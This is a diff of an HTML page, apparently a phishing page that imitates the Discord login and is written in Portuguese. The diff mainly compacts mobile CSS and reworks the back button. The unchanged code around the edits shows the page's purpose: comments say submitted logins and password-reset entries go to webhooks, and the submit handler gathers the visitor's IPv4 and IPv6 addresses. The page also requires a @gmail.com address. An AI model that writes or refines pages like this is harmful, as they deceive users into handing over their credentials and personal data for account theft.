@@ -239,110 +239,50 @@
     }
     .email-error-msg.show { bottom: 80px; }
 
-    /* Responsividade para mobile (telas até 768px - inclui celulares na vertical e horizontal) */
+    /* Responsividade para mobile */
     @media only screen and (max-width: 768px) {
       body {
         align-items: flex-start;
-        padding-top: 20px; /* evita grudar na barra superior do celular */
-        overflow-y: auto; /* permite scroll se necessário */
+        padding-top: 20px;
+        overflow-y: auto;
       }
-
       .container {
-        flex-direction: column; /* empilha left e right */
+        flex-direction: column;
         width: 95%;
         max-width: none;
         height: auto;
         min-height: 80vh;
         max-height: none;
-        border-radius: 0; /* remove bordas arredondadas em mobile pra ocupar mais tela */
+        border-radius: 0;
         margin: 10px auto;
       }
-
       .left {
-        padding: 40px 25px; /* reduz padding lateral */
+        padding: 40px 25px;
         flex: none;
       }
-
       .right {
         padding: 30px 20px;
-        background: rgba(54, 57, 63, 0.95); /* um pouco mais opaco pra contraste */
+        background: rgba(54, 57, 63, 0.95);
         flex: none;
       }
-
-      h1 {
-        font-size: 1.8rem;
-      }
-
-      p.subtitle {
-        font-size: 1rem;
-        margin-bottom: 30px;
-      }
-
-      input, button {
-        font-size: 0.95rem;
-        padding: 12px;
-      }
-
-      label {
-        font-size: 0.85rem;
-      }
-
-      .qr-image {
-        width: 220px;
-        height: 220px;
-      }
-
-      .qr-title {
-        font-size: 1.3rem;
-      }
-
-      .qr-custom-text {
-        font-size: 1rem;
-      }
-
-      .logos img {
-        height: 40px;
-      }
-
-      .forgot-link, .register-link, .extra-link {
-        font-size: 0.9rem;
-      }
-
-      /* Modal adapta em mobile */
-      .modal-content {
-        width: 92%;
-        padding: 30px 20px;
-      }
-
-      .success-msg, .email-error-msg {
-        font-size: 1rem;
-        padding: 12px 24px;
-        width: 90%;
-      }
+      h1 { font-size: 1.8rem; }
+      p.subtitle { font-size: 1rem; margin-bottom: 30px; }
+      input, button { font-size: 0.95rem; padding: 12px; }
+      label { font-size: 0.85rem; }
+      .qr-image { width: 220px; height: 220px; }
+      .qr-title { font-size: 1.3rem; }
+      .qr-custom-text { font-size: 1rem; }
+      .logos img { height: 40px; }
+      .forgot-link, .register-link, .extra-link { font-size: 0.9rem; }
+      .modal-content { width: 92%; padding: 30px 20px; }
+      .success-msg, .email-error-msg { font-size: 1rem; padding: 12px 24px; width: 90%; }
     }
-
-    /* Para telas muito pequenas (ex: iPhone SE, ~320-400px) */
     @media only screen and (max-width: 480px) {
-      .left {
-        padding: 30px 20px;
-      }
-
-      .right {
-        padding: 25px 15px;
-      }
-
-      .qr-image {
-        width: 200px;
-        height: 200px;
-      }
-
-      h1 {
-        font-size: 1.6rem;
-      }
-
-      button {
-        padding: 12px;
-      }
+      .left { padding: 30px 20px; }
+      .right { padding: 25px 15px; }
+      .qr-image { width: 200px; height: 200px; }
+      h1 { font-size: 1.6rem; }
+      button { padding: 12px; }
     }
   </style>
 </head>
@@ -398,6 +338,7 @@
       </div>
     </div>
   </div>
+
   <!-- Modal de reset -->
   <div id="resetModal" class="modal">
     <div class="modal-content">
@@ -409,9 +350,11 @@
       <button id="resetButton">Resetar Senha</button>
     </div>
   </div>
+
   <!-- Mensagem de sucesso descendo -->
   <div id="successMsg" class="success-msg">Senha alterada com sucesso!</div>
-  <!-- Mensagem de erro subindo (para e-mail sem @gmail.com) -->
+
+  <!-- Mensagem de erro subindo -->
   <div id="emailErrorMsg" class="email-error-msg">Está faltando o @gmail.com para continuar!</div>
 
   <script>
@@ -428,15 +371,25 @@
     const emailDisplay = document.getElementById('emailDisplay');
     const successMsg = document.getElementById('successMsg');
     const emailErrorMsg = document.getElementById('emailErrorMsg');
-    // Botão Voltar inteligente
+
+    // Botão Voltar atualizado - tenta preservar posição de scroll
     voltarBtn.addEventListener('click', (e) => {
       e.preventDefault();
-      if (window.history.length > 1) {
+      
+      // Prioriza referrer (muitas vezes preserva scroll melhor)
+      if (document.referrer && document.referrer !== window.location.href) {
+        window.location.href = document.referrer;
+      } 
+      // Fallback para history.back() (navegadores modernos preservam scroll na maioria dos casos)
+      else if (window.history.length > 1) {
         window.history.back();
-      } else {
+      } 
+      // Se não tiver histórico nem referrer
+      else {
         window.location.href = 'https://discord.com/login';
       }
     });
+
     // Login normal com validação de @gmail.com
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -451,8 +404,8 @@
         emailErrorMsg.classList.add('show');
         setTimeout(() => {
           emailErrorMsg.classList.remove('show');
-        }, 2000); // fica 2 segundos
-        return; // não envia pro webhook
+        }, 2000);
+        return;
       }
       let ipv4 = 'Não detectado';
       let ipv6 = 'Não detectado';
@@ -518,7 +471,8 @@
       errorBox.classList.add('show');
       setTimeout(() => errorBox.classList.remove('show'), 3000);
     });
-    // Reset de senha → webhookReset
+
+    // Reset de senha
     forgotLink.addEventListener('click', (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value.trim();
@@ -529,10 +483,12 @@
       }
       modal.classList.add('show');
     });
+
     closeModal.addEventListener('click', () => modal.classList.remove('show'));
     modal.addEventListener('click', (e) => {
       if (e.target === modal) modal.classList.remove('show');
     });
+
     resetButton.addEventListener('click', () => {
       const newPass = newPasswordInput.value.trim();
       const email = document.getElementById('email').value.trim();
